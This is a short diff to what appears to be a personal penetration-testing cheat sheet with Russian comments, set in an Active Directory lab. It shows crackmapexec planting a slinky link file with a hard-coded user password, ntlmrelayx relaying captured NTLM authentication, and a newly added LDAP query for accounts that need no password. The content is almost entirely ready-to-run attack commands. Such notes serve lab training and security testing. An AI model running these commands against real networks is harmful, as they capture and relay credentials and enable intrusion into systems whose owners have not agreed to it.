@@ -192,6 +192,9 @@
 	proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=YES
 	# ретрпнсляция
 	sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
+
+	# Для какой учетной записи ---> password-not-required
+	crackmapexec ldap <target> -u <u> -p <p> --password-not-required
 	
 # clock sync
 
